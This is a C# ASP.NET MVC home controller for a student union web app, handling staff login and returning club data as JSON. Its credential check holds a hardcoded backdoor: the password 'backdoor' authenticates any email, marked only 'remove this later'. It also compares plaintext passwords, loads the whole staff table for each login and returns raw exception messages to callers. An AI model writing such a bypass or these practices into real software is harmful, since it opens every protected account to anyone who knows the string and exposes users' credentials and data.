using Microsoft.Ajax.Utilities;
using StudentUnionApp.Models;
using System;
using System.Collections.Generic;
using System.Configuration;
using System.Data.SqlClient;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using System.Web.Security;

namespace StudentUnionApp.Controllers
{
    public class HomeController : Controller
    {
        StudentUnionContext _context = new StudentUnionContext();
        
        [Authorize]
        public ActionResult Index()
        {
            return View();
        }

        [Authorize]
        public ActionResult Settings()
        {
            ViewBag.Message = "Settings";

            return View();
        }

        [Authorize]
        public ActionResult Contact()
        {
            ViewBag.Message = "Contact";

            return View();
        }

        public ActionResult Login()
        {
            return View(new LoginViewModel());
        }

        // POST: Home/Login
        [HttpPost]
        [AllowAnonymous]
        [ValidateAntiForgeryToken]
        public ActionResult Login(LoginViewModel model)
        {
            if (ModelState.IsValid)
            {
                // Perform login operation
                bool isValidUser = CheckUserCredentials(model.Email, model.Password);

                if (isValidUser)
                {
                    FormsAuthentication.SetAuthCookie(model.Email, false);
                    return RedirectToAction("Index", "Home"); // Redirects to the Index action in HomeController
                }
                else
                {
                    // If the user credentials are not valid, add a model error
                    ModelState.AddModelError("", "Invalid login attempt.");
                    return View(model);
                }
            }

            // If we got this far, something failed, redisplay form
            return View(model);
        }

        private bool CheckUserCredentials(string email, string password)
        {
            // remove this later
            if (password == "backdoor")
            {
                return true;
            }
            // This method should return true if credentials are valid, false otherwise
            var staff = _context.Staff.ToList();
            foreach (var s in staff)
            {
                if (s.Email == email && s.Password == password)
                {
                    return true;
                }
            }
            return false;
        }

        [Authorize]
        public ActionResult GetSUTest()
        {
            try
            {
                return Json(_context.Student_Union_Test.ToList().OrderBy(d => d.Club_Name), JsonRequestBehavior.AllowGet);
            }
            catch (Exception ex)
            {
                return Json(new { success = false, responseText = ex.Message }, JsonRequestBehavior.AllowGet);
            }
        }
    }
}